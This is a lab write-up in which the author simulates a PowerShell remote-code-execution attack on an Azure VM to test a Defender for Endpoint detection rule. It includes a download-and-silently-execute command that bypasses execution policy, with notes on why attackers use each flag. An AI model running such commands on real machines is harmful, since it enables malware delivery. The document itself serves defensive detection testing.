# 03 - Attack Simulation

## Introduction

In this phase of the project, I simulated a realistic Remote Code Execution (RCE) attack using PowerShell. The purpose of this simulation was to validate the effectiveness of the custom detection rule I had configured in Microsoft Defender for Endpoint (MDE). By mimicking attacker behaviour through a controlled script execution, I was able to observe how the endpoint protection system responded in a real-time scenario.

To emulate an attacker’s workflow, I used PowerShell to download and install a legitimate application (7-Zip) from an external source. This provided a safe yet practical example of how attackers often introduce payloads into a compromised system.

## Step-by-Step Procedure

### Simulate the Attack

#### Action

I logged into the compromised Windows 10 virtual machine (VM) hosted in Microsoft Azure and executed the following PowerShell command to simulate the RCE attack:

```powershell
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\ProgramData\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```
## Explanation of the Command

- **`cmd.exe /c`**: Executes a command using the Windows command-line interface (`cmd.exe`).

- **`powershell.exe -ExecutionPolicy Bypass -NoProfile`**: Launches PowerShell with the execution policy bypassed and user profiles excluded. This is a common tactic used by attackers to evade execution restrictions and reduce traces of execution.

- **`Invoke-WebRequest`**: Downloads the 7-Zip installer from a remote server. In a real attack, this command could be used to retrieve malware or scripts.

- **`-OutFile C:\ProgramData\7z2408-x64.exe`**: Specifies the file path where the downloaded executable will be saved. The `ProgramData` directory is often writable and frequently targeted in attacks.

- **`Start-Process 'C:\ProgramData\7z2408-x64.exe' -ArgumentList '/S' -Wait`**: Executes the downloaded file with the `/S` flag for silent installation, ensuring that the installation proceeds without user prompts or UI, while `-Wait` ensures the command session remains active until the installation is complete.

## Why This Attack Simulation is Important

This simulation closely mirrors tactics used by real-world adversaries who exploit PowerShell’s capabilities to deliver and execute malicious payloads. Executing this simulation served several key purposes:

- It allowed me to validate the effectiveness of the custom detection rule I created, which was designed to flag the use of `Invoke-WebRequest` in combination with `Start-Process`.
- It tested whether MDE would respond appropriately by isolating the device to contain the threat.
- It confirmed the automatic collection of an investigation package, which includes critical forensic artefacts necessary for post-incident analysis.

## Outcomes

- **Detection Rule Triggered**: As expected, the detection rule fired upon execution of the simulated attack, confirming the reliability of my KQL query.
- **Device Isolation**: The virtual machine was automatically isolated by MDE. This broke the device’s network connection to prevent further lateral movement or command-and-control activity.
- **Investigation Package**: MDE collected a full investigation package, which included process trees, file and registry activity, event logs, and network connections. This data allowed me to review the attack in detail and assess the potential impact.

## Summary

By simulating an RCE attack using PowerShell, I was able to demonstrate how endpoint protection tools like Microsoft Defender for Endpoint can be configured to detect specific attacker behaviours and respond automatically. This exercise strengthened my understanding of PowerShell-based attack vectors, defensive detection logic using KQL, and the incident response features within the MDE platform.
